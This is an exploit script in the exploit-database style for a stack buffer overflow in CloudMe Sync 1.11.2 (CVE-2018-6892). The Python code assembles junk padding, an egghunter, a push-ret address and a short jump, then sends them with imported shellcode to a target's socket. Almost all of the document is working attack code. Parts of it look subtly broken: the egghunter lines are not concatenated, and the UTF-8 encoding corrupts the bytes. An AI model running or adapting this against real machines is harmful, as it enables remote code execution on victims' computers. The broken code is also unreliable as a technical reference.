#######################################################
# Exploit Title: CloudMe Sync v1.11.2 Buffer Overflow + Egghunt
# Date: 23.04.2018
# Exploit Author:T3jv1l
# Vendor Homepage:https://www.cloudme.com/en
# Software: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Category:Local
# Contact:https://twitter.com/T3jv1l
# Version: CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt
# Tested on: Windows 7 SP1 x86
# CVE-2018-6892
# Real exploit https://www.exploit-db.com/exploits/44027 in version 1.11.0
# Hello subinacls and NytroRST !

#############################################################

from payload import buf
import socket

def shell_attack(target_machine, target_port):

	egg = "\x66\x81\xca\xff\x0f\x42\x52\x6a"
	"\x02\x58\xcd\x2e\x3c\x05\x5a\x74" #boom
	"\xef\xb8\x62\x6f\x6f\x6d\x8b\xfa" 
	"\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

	target=target_machine
	junk=b"A"*1015			
	jmp=b"\xd9\x37\x99\x69"  #0x699937d9 push ret
	jump_back=b"\xeb\xc4"    #jump -60 bytes


	#Shellcode calc.exe
	egg = bytes(egg, 'utf-8')
	payload1=junk+egg+b"B"*5 + jmp + jump_back
	payload2=b"boomboom" + buf

	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print("Object is made")
		s.connect((target,target_port))
		s.send(payload1+payload2)
	except:
		pass